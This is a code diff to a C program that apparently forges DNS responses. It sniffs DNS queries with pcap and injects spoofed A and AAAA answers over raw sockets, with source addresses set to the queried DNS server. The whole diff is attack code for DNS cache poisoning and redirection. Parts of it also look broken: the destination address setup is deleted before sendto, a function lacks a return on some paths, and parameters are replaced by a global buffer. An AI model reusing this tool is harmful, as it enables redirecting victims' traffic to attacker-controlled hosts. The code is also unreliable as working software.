@@ -53,11 +53,11 @@ void process_ipv4(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
             strcpy(opts.dns_ip, inet_ntoa(ip_addr));
 
             answer = response + sizeof(struct iphdr) + sizeof(struct udphdr);
-            size_dns_payload = set_payload(dns_hdr, answer, request, opts.ipv6_flag);
+            size_dns_payload = set_payload(opts.ipv6_flag);
             size_res_payload = (sizeof(struct ip) + sizeof(struct udphdr)) + size_dns_payload;
             answer = response;
-            create_ipv4_header(answer, size_dns_payload, size_res_payload);
-            send_dns_answer(answer, size_res_payload);
+            create_ipv4_header(response, size_dns_payload, size_res_payload);
+            send_dns_answer(response, size_res_payload);
         }
     }
 }
@@ -99,11 +99,11 @@ void process_ipv6(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
             opts.tid = ntohs(dns_hdr->id);
 
             answer = response + sizeof(struct ip6_hdr) + sizeof(struct udphdr);
-            size_dns_payload = set_payload(dns_hdr, answer, request, opts.ipv6_flag);
+            size_dns_payload = set_payload(opts.ipv6_flag);
             size_res_payload = (sizeof(struct ip6_hdr) + sizeof(struct udphdr)) + size_dns_payload;
+            answer = response;
             create_ipv6_header(response, size_dns_payload, size_res_payload);
-            for (int i = 0; i < 10; i++)
-                send_dns_answer2(response, size_res_payload);
+            send_dns_answer2(response, size_res_payload);
         }
     }
 }
@@ -119,7 +119,6 @@ void process_ipv6(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
 void handle_DNS_query(struct dnsquery* dns_query, char *request) {
     unsigned int i, j, k;
     uint8_t* curr = (uint8_t*)dns_query;
-    char type[3] = {0};
     unsigned int size;
 
     size = (unsigned int) curr[0];
@@ -145,10 +144,11 @@ void handle_DNS_query(struct dnsquery* dns_query, char *request) {
 }
 
 
-uint16_t set_payload(struct dnshdr *dns_hdr, char* answer, char* request, bool flag) {
+uint16_t set_payload(bool flag) {
     struct dnshdr* dns = NULL;
     char* token;
     int i = 0;
+    uint8_t addr[IPV6_LEN];
 
 
     dns = (struct dnshdr*) answer;
@@ -193,24 +193,33 @@ uint16_t set_payload(struct dnshdr *dns_hdr, char* answer, char* request, bool f
     memcpy(answer, "\x00\x00\x00\x99", 4);  // ttl
     answer += 4;
 
-    memcpy(answer, "\x00\x04", 2);   // data len
-    answer += 2;
+    if (opts.type[1] == '\x01') {
+        memcpy(answer, "\x00\x04", 2);   // data len
+        answer += 2;
 
-    token = strtok(opts.spoofing_ip, ".");
-    while(token != NULL) {
-        answer[i] = (uint8_t) atoi(token);
-        token = strtok(NULL, ".");
-        i++;
+        token = strtok(opts.spoofing_ip, ".");
+        while (token != NULL) {
+            answer[i] = (uint8_t) atoi(token);
+            token = strtok(NULL, ".");
+            i++;
+        }
+        return (uint16_t) (12 + strlen((char *) opts.query_name) + 1 + 20);
     }
 
+    if (opts.type[1] == '\x1c') {
+        memcpy(answer, "\x00\x10", 2);   // data len
+        answer += 2;
 
-    return (uint16_t) (12 + strlen((char *) opts.query_name) + 1 + 20);
+        inet_pton(AF_INET6, opts.device_ipv6, addr);
+        memcpy(answer, addr, IPV6_LEN);
+        return (uint16_t) (12 + strlen((char *) opts.query_name) + 1 + 32);
+    }
 }
 
 
 void create_ipv4_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
-    struct ip *ip_header = (struct ip *) response_packet;
-    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip));
+    struct ip *ip_header = (struct ip *) answer;
+    struct udphdr *udp_header = (struct udphdr *) (answer + sizeof (struct ip));
 
     /* IP header */
     ip_header->ip_hl = 5;
@@ -234,8 +243,8 @@ void create_ipv4_header(char* response_packet, uint16_t size_dns_payload, uint16
 
 
 void create_ipv6_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
-    struct ip6_hdr *ipv6_header = (struct ip6_hdr *) response_packet;
-    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip6_hdr));
+    struct ip6_hdr *ipv6_header = (struct ip6_hdr *) answer;
+    struct udphdr *udp_header = (struct udphdr *) (answer + sizeof (struct ip6_hdr));
     struct in6_addr srcAddr, dstAddr;
 
     inet_pton(AF_INET6, opts.dns_ipv6, &srcAddr);
@@ -260,34 +269,31 @@ void send_dns_answer(char* response_packet, uint16_t size_response_payload) {
     struct sockaddr_in sin;
     int bytes_sent;
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    int one = 1;
 
     if (sock < 0) {
         fprintf(stderr, "Error creating socket");
         return;
     }
-    sin.sin_family = AF_INET;
-    sin.sin_port = 53;
-    sin.sin_addr.s_addr = inet_addr(opts.dns_ip);
 
-
-    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&sin, sizeof(sin));
+    bytes_sent = (int)sendto(sock, answer, size_response_payload, 0, (struct sockaddr *)&sin, sizeof(sin));
     if(bytes_sent < 0)
-        fprintf(stderr, "Error sending data");
+        fprintf(stderr, "Error sending data\n");
+    puts("packet sent");
 }
 
 
 void send_dns_answer2(char* response_packet, uint16_t size_response_payload) {
     struct sockaddr_in6 sin;
     ssize_t bytes_sent = 0;
-    int sock = socket(AF_INET6, SOCK_DGRAM,IPPROTO_UDP);
+    int sock = socket(AF_INET6, SOCK_RAW,IPPROTO_RAW);
 
     if (sock < 0) {
         fprintf(stderr, "Error creating socket");
         return;
     }
 
-    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&sin, sizeof(sin));
+    bytes_sent = sendto(sock, answer, size_response_payload, 0, (struct sockaddr *)&sin, sizeof(sin));
     if(bytes_sent < 0)
-        fprintf(stderr, "Error sending data");
+        fprintf(stderr, "Error sending data\n");
+    puts("packet sent");
 }
